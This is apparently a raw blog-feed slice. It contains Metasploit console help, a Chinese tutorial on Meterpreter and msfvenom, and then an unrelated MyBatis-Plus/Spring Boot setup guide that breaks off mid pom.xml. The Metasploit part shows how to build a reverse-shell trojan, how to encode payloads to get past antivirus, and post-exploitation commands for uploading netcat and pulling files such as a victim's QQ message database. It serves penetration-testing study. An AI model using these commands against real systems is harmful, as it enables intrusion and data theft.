Credentials Backend Commands
============================

    Command       Description
    -------       -----------
    creds         List all credentials in the database


Developer Commands
==================

    Command       Description
    -------       -----------
    edit          Edit the current module or a file with the preferred editor
    irb           Open an interactive Ruby shell in the current context
    log           Display framework.log paged to the end if possible
    pry           Open the Pry debugger on the current module or Framework
    reload_lib    Reload Ruby library files from specified paths


msfconsole
==========

`msfconsole` is the primary interface to Metasploit Framework. There is quite a
lot that needs go here, please be patient and keep an eye on this space!

Building ranges and lists
-------------------------

Many commands and options that take a list of things can use ranges to avoid
having to manually list each desired thing. All ranges are inclusive.

### Ranges of IDs

Commands that take a list of IDs can use ranges to help. Individual IDs must be
separated by a `,` (no space allowed) and ranges can be expressed with either
`-` or `..`.

### Ranges of IPs

There are several ways to specify ranges of IP addresses that can be mixed
together. The first way is a list of IPs separated by just a ` ` (ASCII space),
with an optional `,`. The next way is two complete IP addresses in the form of
`BEGINNING_ADDRESS-END_ADDRESS` like `127.0.1.44-127.0.2.33`. CIDR
specifications may also be used, however the whole address must be given to
Metasploit like `127.0.0.0/8` and not `127/8`, contrary to the RFC.
Additionally, a netmask can be used in conjunction with a domain name to
dynamically resolve which block to target. All these methods work for both IPv4
and IPv6 addresses. IPv4 addresses can also be specified with special octet
ranges from the [NMAP target
specification](https://nmap.org/book/man-target-specification.html)
### Examples
Terminate the first sessions:
    sessions -k 1
Stop some extra running jobs:
    jobs -k 2-6,7,8,11..15
Check a set of IP addresses:
    check 127.168.0.0/16, 127.0.0-2.1-4,15 127.0.0.255
Target a set of IPv6 hosts:
    set RHOSTS fe80::3990:0000/110, ::1-::f0f0
Target a block from a resolved domain name:
    set RHOSTS www.example.test/24
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;meterpreter&quot;&gt;Meterpreter&lt;/h1&gt;

&lt;h2 id=&quot;介绍&quot;&gt;介绍&lt;/h2&gt;

&lt;p&gt;Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpreter shell的链接。Meterpreter shell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。另外Meterpreter能够躲避入侵检测系统。在远程主机上隐藏自己,它不改变系统硬盘中的文件,因此HIDS[基于主机的入侵检测系统]很难对它做出响应。此外它在运行的时候系统时间是变化的,所以跟踪它或者终止它对于一个有经验的人也会变得非常困难。&lt;/p&gt;

&lt;p&gt;最后,Meterpreter还可以简化任务创建多个会话。可以来利用这些会话进行渗透。在Metasploit Framework中，Meterpreter是一种后渗透工具，它属于一种在运行过程中可通过网络进行功能扩展的动态可扩展型Payload。这种工具是基于“内存DLL注入”理念实现的，它能够通过创建一个新进程并调用注入的DLL来让目标系统运行注入的DLL文件。其中，攻击者与目标设备中Meterpreter的通信是通过Stager套接字实现的meterpreter作为后渗透模块有多种类型，并且命令由核心命令和扩展库命令组成，极大的丰富了攻击方式。&lt;/p&gt;

&lt;p&gt;需要说明的meterpreter在漏洞利用成功后会发送第二阶段的代码和meterpreter服务器dll，所以在网络不稳定的情况下经常出现没有可执行命令，或者会话建立执行help之后发现缺少命令。 连上vpn又在内网中使用psexec和bind_tcp的时候经常会出现这种情况&lt;/p&gt;

&lt;h2 id=&quot;常用的反弹类型&quot;&gt;常用的反弹类型&lt;/h2&gt;

&lt;h3 id=&quot;reverse_tcp&quot;&gt;reverse_tcp&lt;/h3&gt;

&lt;p&gt;这是一个基于TCP的反向链接反弹shell, 使用起来很稳定&lt;/p&gt;

&lt;p&gt;使用下列命令生成一个Linux下反弹shell木马：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=你的IP lport=监听端口  -f elf -o shell
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;关于生成木马后续再提&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;然后我们打开Metasploit，使用模块handler，设置payload，注意：这里设置的payload要和我们生成木马所使用的payload一样,配置好参数就可以开始监听,当目标运行木马们就可以反弹shell了&lt;/p&gt;

&lt;h3 id=&quot;reverse_http&quot;&gt;reverse_http&lt;/h3&gt;

&lt;p&gt;基于http方式的反向连接，在网速慢的情况下不稳定&lt;/p&gt;

&lt;h3 id=&quot;bind_tcp&quot;&gt;bind_tcp&lt;/h3&gt;

&lt;p&gt;这是一个基于TCP的正向连接shell，因为在内网跨网段时无法连接到attack的机器，所以在内网中经常会使用，不需要设置LHOST&lt;/p&gt;

&lt;h2 id=&quot;payload&quot;&gt;Payload&lt;/h2&gt;

&lt;p&gt;Metasploit中的Payload模块主要有以下三种类型：&lt;/p&gt;

&lt;p&gt;-Single&lt;/p&gt;

&lt;p&gt;-Stager&lt;/p&gt;

&lt;p&gt;-Stage&lt;/p&gt;

&lt;p&gt;Single是一种完全独立的Payload，而且使用起来就像运行calc.exe一样简单，例如添加一个系统用户或删除一份文件。由于Single Payload是完全独立的，因此它们有可能会被类似&lt;a href=&quot;https://en.wikipedia.org/wiki/Netcat&quot;&gt;netcat&lt;/a&gt;这样的非metasploit处理工具所捕捉到。&lt;/p&gt;

&lt;p&gt;Stager这种Payload负责建立目标用户与攻击者之间的网络连接，并下载额外的组件或应用程序。一种常见的Stagers Payload就是reverse_tcp，它可以让目标系统与攻击者建立一条tcp连接。另一种常见的是bind_tcp，它可以让目标系统开启一个tcp监听器，而攻击者随时可以与目标系统进行通信。&lt;/p&gt;

&lt;p&gt;Stage是Stager Payload下载的一种Payload组件，这种Payload可以提供更加高级的功能，而且没有大小限制&lt;/p&gt;

&lt;h2 id=&quot;meterpreter的常用命令&quot;&gt;Meterpreter的常用命令&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;help# 查看Meterpreter帮助
background#返回，把meterpreter后台挂起
bgkill# 杀死一个背景 meterpreter 脚本
bglist#提供所有正在运行的后台脚本的列表
bgrun#作为一个后台线程运行脚本
channel#显示活动频道
sessions -i number # 与会话进行交互，number表示第n个session,使用session -i 连接到指定序号的meterpreter会话已继续利用
sesssions -k  number #与会话进行交互
close# 关闭通道
exit# 终止 meterpreter 会话
quit# 终止 meterpreter 会话
interact id #切换进一个信道
run#执行一个已有的模块，这里要说的是输入run后按两下tab，会列出所有的已有的脚本，常用的有autoroute,hashdump,arp_scanner,multi_meter_inject等
irb# 进入 Ruby 脚本模式
read# 从通道读取数据
write# 将数据写入到一个通道
run和bgrun# 前台和后台执行以后它选定的 meterpreter 脚本
use# 加载 meterpreter 的扩展
load/use#加载模块

Resource#执行一个已有的rc脚本

2.文件系统命令

cat c:\boot.ini#查看文件内容,文件必须存在

del c:\boot.ini #删除指定的文件

upload /root/Desktop/netcat.exe c:\ # 上传文件到目标机主上，如upload  setup.exe C:\\windows\\system32\

download nimeia.txt /root/Desktop/   # 下载文件到本机上如：download C:\\boot.ini /root/或者download C:\\&quot;ProgramFiles&quot;\\Tencent\\QQ\\Users\\295******125\\Msg2.0.db /root/

edit c:\boot.ini  # 编辑文件

getlwd#打印本地目录

getwd#打印工作目录

lcd#更改本地目录

ls#列出在当前目录中的文件列表

lpwd#打印本地目录

pwd#输出工作目录

cd c:\\ #进入目录文件下

rm file #删除文件

mkdir dier #在受害者系统上的创建目录

rmdir#受害者系统上删除目录

dir#列出目标主机的文件和文件夹信息

mv#修改目标主机上的文件名

search -d d:\\www -f web.config #search 文件，如search  -d c:\\  -f*.doc

meterpreter &amp;gt; search -f autoexec.bat  #搜索文件

meterpreter &amp;gt; search -f sea*.bat c:\\xamp\\

enumdesktops     #用户登录数
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;msfvenom&quot;&gt;msfvenom&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;木马生成工具&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;help-1&quot;&gt;HELP&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Options:
-p, --payload    &amp;lt;payload&amp;gt;       指定需要使用的payload(攻击荷载)。如果需要使用自定义的payload，请使用&amp;amp;#039;-&amp;amp;#039;或者stdin指定
-l, --list       [module_type]   列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all
-n, --nopsled    &amp;lt;length&amp;gt;        为payload预先指定一个NOP滑动长度
-f, --format     &amp;lt;format&amp;gt;        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)
-e, --encoder    [encoder]       指定需要使用的encoder（编码器）
-a, --arch       &amp;lt;architecture&amp;gt;  指定payload的目标架构
--platform   &amp;lt;platform&amp;gt;      指定payload的目标平台
-s, --space      &amp;lt;length&amp;gt;        设定有效攻击荷载的最大长度
-b, --bad-chars  &amp;lt;list&amp;gt;          设定规避字符集，比如: &amp;amp;#039;\x00\xff&amp;amp;#039;
-i, --iterations &amp;lt;count&amp;gt;         指定payload的编码次数
-c, --add-code   &amp;lt;path&amp;gt;          指定一个附加的win32 shellcode文件
-x, --template   &amp;lt;path&amp;gt;          指定一个自定义的可执行文件作为模板
-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行
--payload-options            列举payload的标准选项
-o, --out   &amp;lt;path&amp;gt;               保存payload
-v, --var-name &amp;lt;name&amp;gt;            指定一个自定义的变量，以确定输出格式
--shellest                   最小化生成payload
-h, --help                       查看帮助选项
--help-formats               查看msf支持的输出格式列表
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;生成payload&quot;&gt;&lt;strong&gt;生成payload&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;生成payload，有有两个必须的选项：-p -f&lt;/p&gt;

&lt;p&gt;使用-p 来指定要使用的payload&lt;/p&gt;

&lt;p&gt;可以使用下面的命令来查看所有msf可用的payload列表&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;./msfvenom -l payloads
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;-p选项也支持使用使用自定义的payload，需要使用 “-“，比如:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;cat payload_file.bin | ./msfvenom -p - -a x86 --platform win -e x86/shikata_ga_nai -f raw
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;使用-f 来指定payload的输出格式&lt;/p&gt;

&lt;p&gt;使用下面的命令，可以产看msf支持的输出格式&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;./msfvenom --help-formats
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;payload编码&quot;&gt;&lt;strong&gt;payload编码&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;如果你使用了-b选项（设定了规避字符集），会自动调用编码器&lt;/p&gt;

&lt;p&gt;其他情况下，你需要使用-e选项来使用编码模块，例如&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以使用下面的命令，来查看可用的编码器&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;./msfvenom -l encoders
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;你也可以使用-i选项进行多次编码。某些情况下，迭代编码可以起到规避杀毒软件的作用，但你需要知道，编码并没有使用一个真正意义上的AV规避方案&lt;/p&gt;

&lt;p&gt;可以使用下面的命令来进行迭代编码&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;规避字符&quot;&gt;&lt;strong&gt;规避字符&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;使用-b选项意味着在生成payload的时候对某些字符进行规避。当你使用这个选项的时候，msfvenom会自动的使用合适的编码器对payload进行编码，比如&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;./msfvenom -p windows/meterpreter/bind_tcp -b &amp;amp;#039;\x00&amp;amp;#039; -f raw
&lt;/code&gt;&lt;/pre&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry><entry><title type="html">veu&amp;amp;spring项目开发</title><link href="http://localhost:4000/_posts/2020-06-25-veu&spring%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91/" rel="alternate" type="text/html" title="veu&amp;spring项目开发" /><published>2020-06-25T00:00:00+08:00</published><updated>2020-06-25T00:00:00+08:00</updated><id>http://localhost:4000/_posts/veu&amp;spring%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91</id><content type="html" xml:base="http://localhost:4000/_posts/2020-06-25-veu&amp;spring%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;基础准备&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;参考&quot;&gt;参考&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://mp.baomidou.com/guide/#%E7%89%B9%E6%80%A7&quot;&gt;mybati-plus&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;数据库配置&quot;&gt;数据库配置&lt;/h1&gt;

&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;DROP TABLE IF EXISTS `user`;
CREATE TABLE `user` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `name` varchar(45) NOT NULL,
  `age` int NOT NULL,
  `email` varchar(45) NOT NULL,
  `create_time` datetime DEFAULT NULL,
  `update_time` datetime DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `id_UNIQUE` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;一般需要在数据库添加&lt;code&gt;Create_time&lt;/code&gt;和&lt;code&gt;update_time&lt;/code&gt;字段,用于记录创建时间和修改时间,可以在操作数据库代码中添加相应代码去实现,不过可以在实体类中加上@TableField注解,再写一个handler继承MetaObjectHandler,实现&lt;code&gt;InsertFill&lt;/code&gt;和&lt;code&gt;updateFill&lt;/code&gt;方法,从而简化代码&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;DROP TABLE IF EXISTS `product`;
CREATE TABLE `product` (
  `id` bigint NOT NULL,
  `name` varchar(30) DEFAULT NULL,
  `price` int DEFAULT '0',
  `version` int DEFAULT '0' COMMENT '乐观锁',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;version 字段 在后续解决同时操作数据库发生冲突,需在其实体类对于的数据上添加@version注解&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;applicationproperties配置&quot;&gt;application.properties配置&lt;/h1&gt;

&lt;pre&gt;&lt;code class=&quot;language-properties&quot;&gt;spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver
spring.datasource.url=jdbc:mysql://localhost:3306/mybatis_plus?serverTimezone=GMT%2B8
spring.datasource.username=name
spring.datasource.password=pass
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;实体类&quot;&gt;实体类&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;创建entity package&lt;/li&gt;
  &lt;li&gt;创建User.class&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;package com.lazycat.mybatis_plus.entity;

import com.baomidou.mybatisplus.annotation.FieldFill;
import com.baomidou.mybatisplus.annotation.IdType;
import com.baomidou.mybatisplus.annotation.TableField;
import com.baomidou.mybatisplus.annotation.TableId;
import lombok.Data;

import java.util.Date;

@Data
public class User {
    @TableId(type =  IdType.AUTO)
    private  long id;
    private  String name;
    private  Integer age;
    private  String email;

    @TableField(fill = FieldFill.INSERT)
    private Date create_time;

    @TableField(fill = FieldFill.INSERT_UPDATE)
    private  Date update_time;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;ul&gt;
    &lt;li&gt;@Data 注解:来源与&lt;code&gt;lombok&lt;/code&gt;,需要配置插件,主要功能是简化,自动生成getter和setter&lt;/li&gt;
    &lt;li&gt;@TableId:主键注解,具体type参考官网&lt;/li&gt;
    &lt;li&gt;@TableField:字段注解(非主键),后续创建类去继承MetaObjectHandler,实现InsertFill和updateFill等主要方法&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;Product&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;package com.lazycat.mybatis_plus.entity;

import com.baomidou.mybatisplus.annotation.Version;
import lombok.Data;

@Data
public class Product {
    private  Long id;
    private  String name;
    private  Integer price;

    @Version
    private  Integer version;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;@Version:乐观锁注解,为了在并发使用数据库时不产生冲突,具体参考测试数据库&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;mapper&quot;&gt;Mapper&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;创建mapper package&lt;/li&gt;
  &lt;li&gt;在mapper下创建UserMapper&lt;code&gt;接口&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;package com.lazycat.mybatis_plus.mapper;

import com.baomidou.mybatisplus.core.mapper.BaseMapper;
import com.lazycat.mybatis_plus.entity.User;
import org.springframework.stereotype.Repository;

@Repository
public interface UserMapper extends BaseMapper&amp;lt;User&amp;gt; {
}
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;主要是要继承&lt;code&gt;BaseMapper&lt;/code&gt;,泛型根据自己定义的实体类&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;ProductMapper&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;package com.lazycat.mybatis_plus.mapper;

import com.baomidou.mybatisplus.core.mapper.BaseMapper;
import com.lazycat.mybatis_plus.entity.Product;
import org.springframework.stereotype.Repository;

@Repository
public interface ProductMapper extends BaseMapper&amp;lt;Product&amp;gt; {
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;handler&quot;&gt;Handler&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;创建Handler package&lt;/li&gt;
  &lt;li&gt;创建MyObjectHandler&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;package com.lazycat.mybatis_plus.handler;

import com.baomidou.mybatisplus.core.handlers.MetaObjectHandler;
import org.apache.ibatis.reflection.MetaObject;
import org.springframework.stereotype.Component;

import java.util.Date;

@Component
public class MyObjectHandler implements MetaObjectHandler {
    @Override
    public void insertFill(MetaObject metaObject) {
        this.setFieldValByName(&quot;create_time&quot;,new Date(),metaObject);
        this.setFieldValByName(&quot;update_time&quot;,new Date(),metaObject);
    }

    @Override
    public void updateFill(MetaObject metaObject) {
        this.setFieldValByName(&quot;update_time&quot;,new Date(),metaObject);
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;主要是继承MetaObjectHandler,实现insertFill,updateFill等方法&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;测试数据库&quot;&gt;测试数据库&lt;/h1&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;package com.lazycat.mybatis_plus;

import com.baomidou.mybatisplus.extension.plugins.pagination.Page;
import com.lazycat.mybatis_plus.entity.Product;
import com.lazycat.mybatis_plus.entity.User;
import com.lazycat.mybatis_plus.mapper.ProductMapper;
import com.lazycat.mybatis_plus.mapper.UserMapper;
import net.minidev.json.JSONUtil;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;

import java.lang.reflect.Array;
import java.util.*;

@SpringBootTest
public class CRUDtest {
    @Autowired
    private UserMapper userMapper;
    @Autowired
    private ProductMapper productMapper;
    @Test
    public void test(){
        User user = new User();
        user.setAge(19);
        user.setEmail(&quot;test@qq.com&quot;);
//        user.setCreate_time(new Date());
//        user.setCreate_time(new Date());
//        user.setId(5);
        user.setName(&quot;hhh&quot;);
        //影响的行数
        int result = userMapper.insert(user);
        System.out.println(&quot;影响的行数&quot;+result);
        System.out.println(&quot;id=&quot;+user.getId());
    }
    @Test
    public void updateById(){
        User user = new User();
        user.setId(1);
        user.setName(&quot;test1&quot;);
        user.setAge(20);
        int result = userMapper.updateById(user);
        System.out.println(&quot;影响行数:&quot;+result);
    }
    @Test
    //并发测试
    public void ConcurrentUpdatetest(){
        Product product1 = productMapper.selectById(1);
        Product product2 = productMapper.selectById(1);
        product1.setPrice(product1.getPrice()+50);
        productMapper.updateById(product1);
        product2.setPrice(product2.getPrice()-30);
        int result = productMapper.updateById(product2);
        if (result == 0){
            System.out.println(&quot;pro2更新失败&quot;);
            System.out.println(&quot;pro2重新更新&quot;);
            product2 = productMapper.selectById(1);
            product2.setPrice(product2.getPrice() - 30);
            productMapper.updateById(product2);
        }
        Product product3 = productMapper.selectById(1);
        System.out.println(product3.getPrice()
        );
    }
    @Test
    public  void BatchSelectTest(){
        List&amp;lt;User&amp;gt; users = userMapper.selectBatchIds(Arrays.asList(-1, 2, 3));
        users.forEach(System.out::println);
    }
    @Test
    public void SelectByMap(){
        HashMap&amp;lt;String,Object&amp;gt; map = new HashMap&amp;lt;&amp;gt;();
        map.put(&quot;email&quot;,&quot;test@qq.com&quot;);
        List&amp;lt;User&amp;gt; users = userMapper.selectByMap(map);
        users.forEach(System.out::println);
    }
    @Test
    public  void SelectPage(){
        Page&amp;lt;User&amp;gt; pages = new Page&amp;lt;&amp;gt;(1,2);
        Page&amp;lt;User&amp;gt; userPage = userMapper.selectPage(pages,null);
        List&amp;lt;User&amp;gt; records = userPage.getRecords();
        records.forEach(System.out::println);
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;配置package&quot;&gt;配置package&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;创建config配置package&lt;/li&gt;
  &lt;li&gt;创建MyBatisPlusConfig&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;package com.lazycat.mybatis_plus.config;

import com.baomidou.mybatisplus.extension.plugins.OptimisticLockerInterceptor;
import org.mybatis.spring.annotation.MapperScan;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.transaction.annotation.EnableTransactionManagement;

@EnableTransactionManagement
@Configuration
@MapperScan(&quot;com.lazycat.mybatis_plus.mapper&quot;)
public class MyBatisPlusConfig {
    /*
        乐观锁
    * */
    @Bean
    public OptimisticLockerInterceptor optimisticLockerInterceptor() {
        return new OptimisticLockerInterceptor();
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;分页&quot;&gt;分页&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;在config package 下编辑MyBatisPlusConfig&lt;/li&gt;
  &lt;li&gt;添加如下插件&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;package com.lazycat.mybatis_plus.config;

import com.baomidou.mybatisplus.extension.plugins.OptimisticLockerInterceptor;
import org.mybatis.spring.annotation.MapperScan;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.transaction.annotation.EnableTransactionManagement;

@EnableTransactionManagement
@Configuration
@MapperScan(&quot;com.lazycat.mybatis_plus.mapper&quot;)
public class MyBatisPlusConfig {
    /*
     乐观锁
    * */
    @Bean
    public OptimisticLockerInterceptor optimisticLockerInterceptor() {
        return new OptimisticLockerInterceptor();
    }
    /*
    分页插件
    * */
    @Bean
    public PaginationInterceptor paginationInterceptor() {
        PaginationInterceptor paginationInterceptor = new PaginationInterceptor();
        // 设置请求的页面大于最大页后操作， true调回到首页，false 继续请求  默认false
        // paginationInterceptor.setOverflow(false);
        // 设置最大单页限制数量，默认 500 条，-1 不受限制
        // paginationInterceptor.setLimit(500);
        // 开启 count 的 join 优化,只针对部分 left join
        paginationInterceptor.setCountSqlParser(new JsqlParserCountOptimize(true));
        return paginationInterceptor;
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;逻辑删除&quot;&gt;逻辑删除&lt;/h1&gt;

&lt;p&gt;在user表里面添加deleted 布尔字段,默认为0&lt;/p&gt;

&lt;p&gt;在实体类User里面添加如下内容:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;@TableLogic
private  Integer deleted;
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;主要是@TableLogic实现了逻辑删除&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;可在application.yml加入如下配置(为默认配置,不添加也可以)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-yml&quot;&gt;mybatis-plus:
  global-config:
    db-config:
      logic-delete-field: flag  #全局逻辑删除字段值 3.3.0开始支持，详情看下面。
      logic-delete-value: 1 # 逻辑已删除值(默认为 1)
      logic-not-delete-value: 0 # 逻辑未删除值(默认为 0)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;也可以在application.properties添加如下配置&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-properties&quot;&gt;mybatis-plus.global-config.db-config.logic-delete-value=1
mybatis-plus.global-config.db-config.logic-not-delete-value=0
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;crdu&quot;&gt;CRDU&lt;/h1&gt;

&lt;p&gt;&lt;a href=&quot;https://mp.baomidou.com/guide/crud-interface.html#service-crud-%E6%8E%A5%E5%8F%A3&quot;&gt;参考&lt;/a&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;父项目配置&quot;&gt;父项目配置&lt;/h1&gt;

&lt;pre&gt;&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&amp;gt;
    &amp;lt;modelVersion&amp;gt;4.0.0&amp;lt;/modelVersion&amp;gt;
    &amp;lt;parent&amp;gt;
        &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;
        &amp;lt;artifactId&amp;gt;spring-boot-starter-parent&amp;lt;/artifactId&amp;gt;
        &amp;lt;version&amp;gt;2.3.1.RELEASE&amp;lt;/version&amp;gt;
        &amp;lt;relativePath/&amp;gt; &amp;lt;!-- lookup parent from repository --&amp;gt;
    &amp;lt;/parent&amp;gt;
    &amp;lt;groupId&amp;gt;com.lazycat&amp;lt;/groupId&amp;gt;
    &amp;lt;artifactId&amp;gt;lazycat&amp;lt;/artifactId&amp;gt;
    &amp;lt;version&amp;gt;0.0.1-SNAPSHOT&amp;lt;/version&amp;gt;
    &amp;lt;name&amp;gt;lazycat&amp;lt;/name&amp;gt;
    &amp;lt;description&amp;gt;Demo project for Spring Boot&amp;lt;/description&amp;gt;

    &amp;lt;properties&amp;gt;
        &amp;lt;java.version&amp;gt;1.8&amp;lt;/java.version&amp;gt;
        &amp;lt;guli.version&amp;gt;0.0.1-SNAPSHOT&amp;lt;/guli.version&amp;gt;
        &amp;lt;mybatis-plus.version&amp;gt;3.0.5&amp;lt;/mybatis-plus.version&amp;gt;
        &amp;lt;velocity.version&amp;gt;2.0&amp;lt;/velocity.version&amp;gt;
        &amp;lt;swagger.version&amp;gt;2.7.0&amp;lt;/swagger.version&amp;gt;
        &amp;lt;aliyun.oss.version&amp;gt;2.8.3&amp;lt;/aliyun.oss.version&amp;gt;
        &amp;lt;jodatime.version&amp;gt;2.10.1&amp;lt;/jodatime.version&amp;gt;
        &amp;lt;poi.version&amp;gt;3.17&amp;lt;/poi.version&amp;gt;
        &amp;lt;commons-fileupload.version&amp;gt;1.3.1&amp;lt;/commons-fileupload.version&amp;gt;
        &amp;lt;commons-io.version&amp;gt;2.6&amp;lt;/commons-io.version&amp;gt;
        &amp;lt;httpclient.version&amp;gt;4.5.1&amp;lt;/httpclient.version&amp;gt;
        &amp;lt;jwt.version&amp;gt;0.7.0&amp;lt;/jwt.version&amp;gt;
        &amp;lt;aliyun-java-sdk-core.version&amp;gt;4.3.3&amp;lt;/aliyun-java-sdk-core.version&amp;gt;
        &amp;lt;aliyun-sdk-oss.version&amp;gt;3.1.0&amp;lt;/aliyun-sdk-oss.version&amp;gt;
        &amp;lt;aliyun-java-sdk-vod.version&amp;gt;2.15.2&amp;lt;/aliyun-java-sdk-vod.version&amp;gt;
